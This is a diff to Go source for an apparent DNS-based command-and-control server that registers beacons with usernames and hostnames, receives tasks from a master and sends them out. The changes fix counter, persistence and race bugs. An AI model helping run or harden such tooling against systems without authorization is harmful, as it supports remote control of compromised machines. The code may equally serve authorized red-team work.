@@ -270,8 +270,8 @@ func (c2 *C2Manager) loadTasksFromDB() error {
 				c2.taskCounter = id + 1
 			}
 		} else if strings.HasPrefix(task.ID, "D") {
-			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id > c2.domainTaskCounter {
-				c2.domainTaskCounter = id
+			if id, err := strconv.Atoi(task.ID[1:]); err == nil && id >= c2.domainTaskCounter {
+				c2.domainTaskCounter = id + 1
 			}
 		}
 
@@ -1576,6 +1576,8 @@ func (c2 *C2Manager) AddTaskFromMaster(masterTaskID, beaconID, command string) {
 	c2.tasks[localTaskID] = task
 
 	if beacon, exists := c2.beacons[beaconID]; exists {
+		// Append a copy of the task value, but updates to c2.tasks[localTaskID]
+		// will be the authoritative source for status changes
 		beacon.TaskQueue = append(beacon.TaskQueue, *task)
 	}
 
@@ -1794,16 +1796,15 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			c2.beacons[beaconID] = beacon
 			logf("[C2] New beacon registered: %s (%s@%s)", beacon.ID, beacon.Username, beacon.Hostname)
 
-			// Persist new beacon
+			// Persist new beacon synchronously before reporting to Master
+			// This ensures beacon state is saved before Master knows about it
 			if c2.db != nil {
-				go func(b *Beacon) {
-					if err := c2.db.SaveBeacon(b); err != nil && c2.debug {
-						logf("[DB] Failed to save new beacon: %v", err)
-					}
-				}(beacon)
+				if err := c2.db.SaveBeacon(beacon); err != nil {
+					logf("[DB] Failed to save new beacon: %v", err)
+				}
 			}
 
-			// Report to Master
+			// Report to Master (async - OK since DB save is complete)
 			if masterClient != nil {
 				go masterClient.ReportBeacon(beacon)
 			}
@@ -1811,7 +1812,7 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 			beacon.LastSeen = now
 			beacon.IPAddress = clientIP
 
-			// Persist update (async to avoid blocking)
+			// Persist update (async to avoid blocking - updates are less critical)
 			if c2.db != nil {
 				go func(id string) {
 					if err := c2.db.UpdateBeaconStatus(id, "active"); err != nil && c2.debug {
@@ -1843,8 +1844,15 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 				return "ACK", true
 			}
 
+			// Mark task as in-progress BEFORE sending to prevent race with other DNS servers
+			c2.tasksInProgress[task.ID] = time.Now()
+
 			beacon.TaskQueue = beacon.TaskQueue[1:] // Dequeue
 			beacon.CurrentTask = task.ID
+			if taskPtr, exists := c2.tasks[task.ID]; exists {
+				taskPtr.Status = "sent"
+				taskPtr.SentAt = &now
+			}
 			task.Status = "sent"
 			task.SentAt = &now
 
